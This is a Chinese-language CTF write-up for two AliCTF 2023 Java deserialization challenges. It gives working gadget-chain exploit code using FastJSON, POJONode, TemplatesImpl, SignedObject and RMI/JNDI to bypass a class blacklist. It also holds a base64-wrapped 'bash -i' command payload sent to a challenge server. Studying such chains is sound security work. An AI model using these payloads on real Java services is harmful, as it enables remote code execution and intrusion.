---
tags: 
  - Java 反序列化
---

# AliCTF 2023

两个 java 题就放一起了。

## ezbean

题目有个 read 路由直接反序列化，而且提供了一个 Bean 能够打 rmi，但是反序列化走的是自己的 MyObjectInputStream，其中通过重写 resolveClass 方法 ban 掉了这样一些类：

```java
private static final String[] blacklist = new String[]{
        "java\\.security.*", "java\\.rmi.*",  "com\\.fasterxml.*", "dev\\.silente\\.javashark\\.solution\\.*",
        "org\\.springframework.*", "org\\.yaml.*", "javax\\.management\\.remote.*"
};
```
依赖包有个 fastjson 60，所以有个 toString2Getter，而 BadAttributeValueExpException 可以触发 toString。调试代码发现其实在 JSONArray/JSONObject 后输入流会变成 SecureObjectInputStream，不会走题目中的过滤，所以可以直接接上 MyBean。

```java
// BadAttributeValueExpException.toString -> FastJSON -> MyBean.getConnect -> RMIConnector.connect
// 有一点需要注意的是在 toString2Getter 中的 Mybean 走的是 SecureObjectInputStream，所以可以直接绕过题目中的 MyObjectInputStream
public static void case1(String jndi) throws Exception {
    JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/" + jndi);
    RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

    MyBean myBean = new MyBean(null, null, rmiConnector);

    // 也可以使用 toString2GetterJSONObject
    // Object json = GFastJson.toString2GetterJSONObject(myBean);
    Object json = GFastJson.toString2GetterJSONArray(myBean);
    Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

    byte[] code = SerializeUtils.serialize(poc);
    System.out.println(Base64.getEncoder().encodeToString(code));
    deserialize(code);
}
```

第二个 poc 是利用了 y4 师傅的[博客](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)，通过引用类型来达到绕过 SecureObjectInputStream autotype 的目的，这里都不用 MyBean 了，直接可以执行 TemplatesImpl。

```java
// BadAttributeValueExpException.toString -> FastJSON -> TemplatesImpl
public static void case2() throws Exception {
    TemplatesImpl templates = STemplates.getEvilTemplates("calc");

    Object json = GFastJson.toString2GetterJSONArray(templates);
    Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

    ArrayList<Object> arrayList = new ArrayList<>();
    arrayList.add(templates);
    arrayList.add(poc);

    byte[] code = SerializeUtils.serialize(arrayList);
    System.out.println(Base64.getEncoder().encodeToString(code));
    deserialize(code);
}
```

第三个 poc 是 SignedObject 二次反序列化 （其实好像并不需要hh）
```java
// 二次反序列化
// BadAttributeValueExpException.toString -> FastJSON -> SignedObject -> MyBean.getConnect -> RMIConnector.connect
public static void case3(String jndi) throws Exception {
    JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/" + jndi);
    RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

    MyBean myBean = new MyBean(null, null, rmiConnector);

    // 也可以使用 toString2GetterJSONObject
    // Object json = GFastJson.toString2GetterJSONObject(myBean);
    Object json = GFastJson.toString2GetterJSONArray(myBean);
    Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

    byte[] p = SerializeUtils.serialize(poc);
    Object obj = GSignedObject.getter2Deserialize(p);
    Object json2 = GFastJson.toString2GetterJSONArray(obj);
    Object bd = GBadAttributeValueExpException.deserialize2ToString(json2);

    byte[] code = SerializeUtils.serialize(bd);
    System.out.println(Base64.getEncoder().encodeToString(code));
    deserialize(code);
}
```

参考：

- y4 师傅两篇文章: [1](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96), [2](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)
- 序列化/反序列化流程分析： [1](https://www.cnpanda.net/sec/893.html), [2](https://www.cnpanda.net/sec/928.html)

## bypassit1

只 ban 了一个 get 方法，Templates 其他方法也能弹，这里学到了一个 toString2Getter 的新类：POJONode，原生存在于 springboot 中。

```java
public static void task1() throws Exception {
    Object templates = STemplates.getEvilTemplates("bash -c {echo,QWQ}|{base64,-d}|{bash,-i}");

    Object json = GPOJONode.toString2Getter(templates);
    Object poc = GBadAttributeValueExpException.deserialize2ToString(json);

    byte[] code = SerializeUtils.serialize(poc);

    MiscUtils.sendToServer("http://112.124.14.13:8070/bypassit", code);
}
```

序列化时需要改动一下 POJONode 的 writeReplace 方法，要么直接删掉，要么可以这样改：
```java
@Override
Object writeReplace() {
    return new POJONode(_value);
}
```